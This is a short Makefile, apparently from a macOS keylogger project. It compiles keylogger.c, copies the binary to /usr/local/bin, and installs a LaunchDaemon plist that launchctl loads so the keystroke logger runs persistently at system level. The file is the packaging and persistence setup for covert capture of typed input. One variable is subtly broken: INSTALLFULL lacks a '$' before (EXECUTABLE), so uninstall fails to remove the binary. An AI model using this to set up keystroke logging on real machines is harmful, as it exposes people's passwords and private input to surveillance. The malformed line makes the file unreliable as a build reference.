CC=clang
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=keylogger.c

EXECUTABLE=keylogger
INSTALLDIR=/usr/local/bin
INSTALLFULL=$(INSTALLDIR)/(EXECUTABLE)

PLIST=keylogger.plist
PLISTDIR=/Library/LaunchDaemons
PLISTFULL=$(PLISTDIR)/$(PLIST)

all: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install:
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)
	cp $(PLIST) $(PLISTDIR)

uninstall: unload
	rm $(INSTALLFULL)
	rm $(PLISTFULL)

load:
	launchctl load $(PLISTFULL)

unload:
	launchctl unload $(PLISTFULL)
